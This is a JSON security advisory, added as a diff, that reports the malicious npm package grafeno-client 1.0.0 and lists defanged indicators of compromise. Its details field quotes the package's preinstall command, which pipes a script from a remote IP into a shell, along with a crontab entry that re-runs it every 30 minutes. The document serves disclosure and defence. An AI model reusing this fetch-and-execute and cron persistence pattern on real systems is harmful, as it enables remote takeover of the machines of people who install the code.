@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11691",
+  "modified": "2026-08-28T22:48:29Z",
+  "published": "2026-08-28T22:48:03Z",
+  "summary": "Malicious code in grafeno-client (npm)",
+  "details": "The preinstall hook of grafeno-client@1.0.0 executes a remote script at install time and installs persistent re-execution. On install it runs `curl -s 216[.]126[.]236[.]46/x.sh|sh` via /bin/bash, downloading and executing a shell script from the IP 216[.]126[.]236[.]46. It then appends a crontab entry `*/30 * * * * curl -s 216[.]126[.]236[.]46/x.sh|sh` (removing any prior entry referencing that IP first) so the remote script is re-fetched and re-executed every 30 minutes. The package ships no legitimate HTTP-client code; its entire behaviour is the remote downloader and persistence implant.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "grafeno-client",
+        "purl": "pkg:npm/grafeno-client"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/grafeno-client/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11691"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-28T22:48:03Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "216[.]126[.]236[.]46"
+        ],
+        "sha256": [
+          "f9ab7469236711c553a6a8b27312924ba4c1d8a6c08d5e4bdb975ca752aa8413"
+        ],
+        "url_observed": [
+          "hxxp://216[.]126[.]236[.]46/x[.]sh"
+        ]
+      }
+    }
+  }
+}
